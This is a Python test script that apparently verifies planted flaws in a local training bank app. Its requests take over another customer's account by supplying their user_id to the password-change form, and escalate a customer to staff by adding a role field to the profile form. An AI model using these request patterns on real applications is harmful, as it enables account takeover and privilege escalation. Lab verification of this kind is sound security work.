"""Verify customer settings and two account-security trust-boundary findings."""

import http.cookiejar
import re
import subprocess
import urllib.parse
import urllib.request
import uuid

BASE = "http://127.0.0.1:8080"


def docker(*args):
    return subprocess.run(
        ["docker", "compose", "exec", "-T", "web", *args],
        capture_output=True, check=True, text=True,
    ).stdout.strip()


def visit(opener, path, fields=None):
    body = None if fields is None else urllib.parse.urlencode(fields).encode()
    with opener.open(urllib.request.Request(BASE + path, data=body), timeout=20) as response:
        return response.url, response.read().decode()


def csrf(page):
    return re.search(r'name="_csrf" value="([^"]+)"', page).group(1)


def create_user(email, name, customer_id):
    output = docker("php", "scripts/create-user.php", email, name, "customer", str(customer_id))
    password = re.search(r"^Password: (.+)$", output, re.MULTILINE).group(1)
    created.append(email)
    user_id = int(docker(
        "php", "-r",
        'require "app/bootstrap.php"; $p=\\CyberRoot\\SerendibBank\\Core\\Database::connect(); '
        '$s=$p->prepare("SELECT id FROM users WHERE email=?"); $s->execute([$argv[1]]); echo $s->fetchColumn();',
        "--", email,
    ))
    return user_id, password


def sign_in(email, password):
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    _, login = visit(opener, "/login")
    url, _ = visit(opener, "/login", {"_csrf": csrf(login), "email": email, "password": password})
    assert url.endswith("/verify")
    _, verify = visit(opener, "/verify")
    code = docker("php", "scripts/read-otp.php", email)
    return opener, *visit(opener, "/verify", {"_csrf": csrf(verify), "code": code})


created = []
actor_email = f"settings-actor-{uuid.uuid4().hex[:12]}@example.test"
victim_email = f"settings-other-{uuid.uuid4().hex[:12]}@example.test"
try:
    actor_id, actor_password = create_user(actor_email, "Test Customer", 1)
    victim_id, victim_password = create_user(victim_email, "Other Customer", 2)
    actor, url, dashboard = sign_in(actor_email, actor_password)
    assert url.endswith("/dashboard") and "Accounts" in dashboard
    _, page = visit(actor, "/settings")
    assert "Personal settings" in page and 'name="user_id"' in page

    url, preferences = visit(actor, "/settings/preferences", {
        "_csrf": csrf(page), "account_alerts": "1", "product_updates": "1", "preferred_contact": "phone",
    })
    assert url.endswith("/settings#preferences") and "updated" in preferences
    assert 'value="phone" selected' in preferences and 'name="product_updates" value="1" checked' in preferences

    changed_password = "Changed-For-Test-4821"
    url, security = visit(actor, "/settings/security", {
        "_csrf": csrf(page), "user_id": str(victim_id), "current_password": actor_password,
        "new_password": changed_password, "confirm_password": changed_password,
    })
    assert url.endswith("/settings#security") and "password has been updated" in security
    victim, url, _ = sign_in(victim_email, changed_password)
    assert url.endswith("/dashboard")
    _, victim_settings = visit(victim, "/settings")
    assert "Other Customer" in victim_settings
    url, own_password = visit(victim, "/settings/security", {
        "_csrf": csrf(victim_settings), "user_id": str(victim_id), "current_password": changed_password,
        "new_password": "Own-Password-Test-4821", "confirm_password": "Own-Password-Test-4821",
    })
    assert url.endswith("/settings#security") and "password has been updated" in own_password

    url, staff_page = visit(actor, "/settings/profile", {
        "_csrf": csrf(page), "display_name": "Test Customer", "email": actor_email, "role": "staff",
    })
    assert url.endswith("/staff") and "Service workspace" in staff_page
    print("Settings, password-target alteration and staff-role alteration passed.")
finally:
    for email in created:
        docker(
            "php", "-r",
            'require "app/bootstrap.php"; $p=\\CyberRoot\\SerendibBank\\Core\\Database::connect(); '
            '$s=$p->prepare("DELETE FROM users WHERE email=?"); $s->execute([$argv[1]]);',
            "--", email,
        )
